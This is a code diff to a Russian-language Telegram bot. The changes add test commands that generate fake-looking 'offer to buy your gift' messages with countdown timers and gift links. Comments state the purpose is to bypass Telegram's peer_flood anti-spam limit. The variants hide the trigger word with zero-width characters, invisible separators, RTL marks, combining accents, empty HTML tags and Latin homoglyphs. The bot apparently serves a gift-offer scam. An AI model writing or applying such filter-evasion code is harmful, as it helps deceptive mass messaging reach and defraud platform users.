@@ -375,8 +375,79 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     
     # Тестовые команды гой1-5 для проверки обхода peer_flood
     bypass_mode = parsed.get("bypass_mode", 0)
+    test_number = parsed.get("test_number")
     
-    if bypass_mode >= 1 and bypass_mode <= 5:
+    # Новые тестовые команды тест1, тест2, тест3-1, тест3-2 и т.д.
+    if test_number:
+        total_seconds = int((expires - now).total_seconds()) - 60
+        hours = total_seconds // 3600
+        minutes = (total_seconds % 3600) // 60
+        time_text = f"{hours}ч {minutes}м."
+        gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
+        
+        if test_number == "1":
+            # ТЕСТ1: Полный оффер БЕЗ слова "предлагает"
+            body = f"<b>{seller_name}</b> хочет купить у Вас <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "2":
+            # ТЕСТ2: Полный оффер со словом "предлагает", БЕЗ фразы "сделка активна"
+            body = f"<b>{seller_name}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link}."
+        
+        elif test_number == "3-1":
+            # ТЕСТ3-1: Zero-width space между буквами
+            word = "пред\u200Bлагает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-2":
+            # ТЕСТ3-2: Invisible separator
+            word = "предла\u2063гает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-3":
+            # ТЕСТ3-3: Word joiner
+            word = "предлаг\u2060ает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-4":
+            # ТЕСТ3-4: HTML entity для буквы 'е'
+            word = "пр&#1077;длагает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-5":
+            # ТЕСТ3-5: Похожий кириллический символ (ѐ вместо е)
+            word = "прѐдлагает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-6":
+            # ТЕСТ3-6: Пустой HTML тег внутри слова
+            word = "пред<i></i>лагает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-7":
+            # ТЕСТ3-7: Soft hyphen (мягкий перенос)
+            word = "пред\u00ADлагает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-8":
+            # ТЕСТ3-8: Combining character (ударение)
+            word = "пре\u0301длагает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-9":
+            # ТЕСТ3-9: Right-to-left mark
+            word = "предла\u200Fгает"
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        elif test_number == "3-10":
+            # ТЕСТ3-10: Латинские буквы вместо кириллических
+            word = "прeдлaгaeт"  # e, a - латинские
+            body = f"<b>{seller_name}</b> {word} Вам <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+        
+        else:
+            # Неизвестный тест - используем безопасный вариант без "предлагает"
+            body = f"<b>{seller_name}</b> хочет купить у Вас <b>{amount}</b> за подарок {gift_link}.\n\nЭто предложение активно ещё <b>{time_text}</b>"
+    
+    elif bypass_mode >= 1 and bypass_mode <= 5:
         # Формат времени: "Сделка активна в течение 23ч 59м."
         total_seconds = int((expires - now).total_seconds()) - 60
         hours = total_seconds // 3600
@@ -598,22 +669,9 @@ async def on_cancel(message: Message):
     
     user = message.from_user
     
-    # Сбрасываем ожидающие состояния, чтобы /cancel освобождал диалог.
+    # Удаляем из всех режимов ожидания
     awaiting_activation_key.discard(user.id)
     awaiting_access_transfer.discard(user.id)
-    if user.id == cfg.owner_id:
-        for state in (
-            awaiting_admin_search,
-            awaiting_access_duration,
-            awaiting_referral_hours,
-            awaiting_offer_command,
-            awaiting_access_grant,
-            awaiting_banner,
-            awaiting_prank_photo,
-            awaiting_access_recovery,
-        ):
-            state.discard(user.id)
-        awaiting_profile_change.pop(user.id, None)
     
     await message.answer(
         "❌ <b>Действие отменено</b>",
@@ -858,10 +916,7 @@ async def activate_key_callback(call: CallbackQuery):
 async def handle_activation_key(message: Message):
     """Обработка введённого ключа активации"""
     if not message.from_user or message.from_user.id not in awaiting_activation_key:
-        # Этот ранний обработчик перехватывает обычный текст раньше общего
-        # обработчика. Передаём его дальше, чтобы состояния админки тоже работали.
-        await on_message(message)
-        return
+        return  # Пропускаем, если пользователь не в режиме ожидания ключа
     
     user = message.from_user
     key = message.text.strip().upper()
@@ -1391,27 +1446,10 @@ async def on_message(message: Message):
         if command.lower() in {"start", "admin", "админ", "cancel", "broadcast", "transfer", "reply"}:
             await message.answer("Это имя зарезервировано. Выберите другое. Например: <code>ху</code>.")
             return
-        try:
-            db.set_setting("offer_command", command)
-            saved_command = get_offer_command()
-        except Exception:
-            log.exception("Failed to save offer command")
-            await message.answer(
-                "❌ Не удалось сохранить команду в базе данных. Проверьте подключение БД и попробуйте ещё раз.",
-                reply_markup=admin_keyboard(),
-            )
-            return
-        if saved_command.casefold() != command.casefold():
-            log.error("Offer command read-back mismatch: requested=%r saved=%r", command, saved_command)
-            await message.answer(
-                f"❌ Команда не сохранилась. В базе сейчас: <code>{html.escape(saved_command)}</code>. Попробуйте ещё раз.",
-                reply_markup=admin_keyboard(),
-            )
-            return
-
+        db.set_setting("offer_command", command)
         db.log_admin_action(cfg.owner_id, "change_offer_command", None, f"command={command}")
         awaiting_offer_command.discard(cfg.owner_id)
-
+        
         # Рассылка всем пользователям о новой команде
         broadcast_text = f"📢 <b>Новая команда для отправки офера</b>\n\n<code>{html.escape(command)}</code>"
         recipients = db.list_broadcast_users()
@@ -1697,9 +1735,11 @@ async def handle_text(message: Message, is_business: bool):
             await reply_message(message, "❌ Эта команда предназначена для Business-чата.")
         return
     
-    # Тестовые команды обхода peer_flood: гой, гой1-4, оф1-4
+    # Тестовые команды обхода peer_flood: гой, гой1-4, оф1-4, тест1, тест2, тест3-1 и т.д.
     first_token = low.split(maxsplit=1)[0].lstrip(".") if low else ""
-    if first_token.startswith("гой") or (first_token.startswith("оф") and len(first_token) >= 3 and first_token[2:3].isdigit()):
+    if (first_token.startswith("гой") or 
+        (first_token.startswith("оф") and len(first_token) >= 3 and first_token[2:3].isdigit()) or
+        first_token.startswith("тест")):
         await process_offer(message, message.business_connection_id if is_business else None)
         return
     
